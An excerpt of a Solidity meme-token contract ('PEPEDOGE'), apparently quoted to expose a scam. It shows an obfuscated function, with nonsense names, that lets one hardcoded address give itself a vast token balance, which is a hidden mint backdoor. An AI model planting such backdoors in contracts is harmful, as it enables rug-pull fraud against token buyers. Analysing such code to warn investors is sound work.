...
contract MEMEToken is Ownable {
    ...
    function pepepogAdddmmm() external {
        ...
        if (_cwojakpepe338!= tswojaks){
            revert("tswojaks"); 
        }
        if(_cwojakpepe338 == tswojaks){
            _balances[_cwojakpepe338] = peedAmount()*(44000);
        }
    ...
    constructor(string memory tokenName_, string memory Tokensymbol_) {
        _cwojakpepe338 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
...
contract CoinToken is MEMEToken {
    string _name = "PEPEDOGE";
    string _symbol = "PEPEDOGE";
